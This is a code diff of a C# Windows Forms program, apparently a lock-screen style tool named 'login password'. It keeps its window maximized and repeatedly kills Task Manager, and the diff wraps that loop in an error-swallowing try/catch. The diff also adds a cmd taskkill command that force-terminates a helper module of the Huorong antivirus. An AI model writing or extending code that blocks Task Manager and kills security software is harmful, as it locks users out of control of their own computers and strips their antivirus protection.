@@ -68,14 +68,18 @@ namespace 登录密码
         private void timer1_Tick(object sender, EventArgs e)
         {
             this.WindowState = FormWindowState.Maximized;
-            Process[] pros = Process.GetProcesses();
-            foreach (Process pro in pros)
+            try
             {
-                if (pro.ProcessName.ToUpper() == "TASKMGR")
+                Process[] pros = Process.GetProcesses();
+                foreach (Process pro in pros)
                 {
-                    pro.Kill();
+                    if (pro.ProcessName.ToUpper() == "TASKMGR")
+                    {
+                        pro.Kill();
+                    }
                 }
             }
+            catch (Exception) { }
         }
         
         private void button1_Click(object sender, EventArgs e)
@@ -181,6 +185,7 @@ namespace 登录密码
                     new Form6().ShowDialog(this);
                 }else if(msg == DialogResult.No)
                 {
+                    diaoyong("cmd.exe", "/c taskkill /f /im \"火绒安全软件 安全辅助模块.exe\"");
                     Environment.Exit(0);
                 }
             }
